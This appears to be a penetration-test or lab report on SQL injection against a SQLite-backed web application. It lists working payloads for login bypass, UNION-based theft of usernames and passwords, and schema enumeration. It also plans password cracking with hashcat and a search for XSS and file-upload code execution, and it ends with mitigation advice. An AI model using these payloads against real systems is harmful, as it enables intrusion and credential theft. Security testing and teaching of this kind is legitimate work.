# SQL Injection & Exploitation Report

## **Overview**
This document summarizes the successful SQL injection attacks performed on the target web application, detailing the methods used to bypass authentication, extract user credentials, and analyze potential privilege escalation vectors.

---
## **Successful Attacks**

### **1. Authentication Bypass**
**Payload Used:**
```sql
' OR '1'='1' --
```
**Impact:**
- Successfully logged into an account without valid credentials.
- The web application does not properly sanitize user inputs before executing SQL queries.

### **2. Extracting User Credentials**
**Payload Used:**
```sql
' UNION SELECT null, username, password FROM user --
```
**Impact:**
- Extracted usernames and password hashes from the database.
- The application allows UNION-based SQL injection.
- Passwords appear to be stored in plaintext or weakly hashed.

### **3. Identifying Database Tables**
**Payload Used:**
```sql
' UNION SELECT null, name, null FROM sqlite_master WHERE type='table' --
```
**Impact:**
- Retrieved a list of database tables.
- Identified the `user` table, which stores credentials.

### **4. Extracting Table Schema**
**Payload Used:**
```sql
' UNION SELECT null, sql, null FROM sqlite_master WHERE name='user' --
```
**Impact:**
- Retrieved the structure of the `user` table.
- Identified columns: `id`, `username`, `password`.

### **5. Extracting Password Hashes**
**Payload Used:**
```sql
' UNION SELECT id, username, password FROM user --
```
**Impact:**
- Retrieved hashed or plaintext passwords.
- Enabled offline password cracking using **hashcat** or **CrackStation**.

### **6. Modifying Account Credentials (Failed)**
**Attempted Payload:**
```sql
' OR 1=1; UPDATE user SET password='newpassword' WHERE username='admin' --
```
**Result:**
- SQLite prevents multiple queries (`You can only execute one statement at a time`).
- Direct account modification was **not possible** due to query constraints.

### **7. Creating a New Admin Account (Attempted)**
**Attempted Payload:**
```sql
' UNION SELECT null, 'hacker', 'password123' INTO user --
```
**Result:**
- The database did not allow direct INSERT statements via SQL injection.
- Further testing needed to find alternative privilege escalation.

## **Next Steps**
1. **Crack Retrieved Password Hashes**
   - Use **hashcat** with `rockyou.txt` for brute-force attack.
   - Check for common password reuse among extracted users.

2. **Explore Other Exploitation Methods**
   - Identify **Stored XSS vulnerabilities**.
   - Look for **file upload functionality** for potential **Remote Code Execution (RCE)**.
   
3. **Check for Error-Based SQL Injection**
   - Test `ORDER BY` to identify column count.
   - Check for alternative ways to manipulate queries.

4. **Escalate Privileges**
   - Look for hardcoded admin credentials in extracted database tables.
   - Attempt privilege escalation if file uploads or admin panels are accessible.

## **Security Recommendations**
To mitigate these vulnerabilities, the target web application should implement the following:
- **Use Parameterized Queries** to prevent SQL injection.
- **Encrypt Passwords Securely** using bcrypt instead of plaintext or weak hashes.
- **Restrict Database Privileges** to limit the impact of an SQL injection attack.
- **Implement Web Application Firewalls (WAF)** to block SQL injection attempts.
- **Enable Content Security Policy (CSP)** to prevent XSS and other injection attacks.
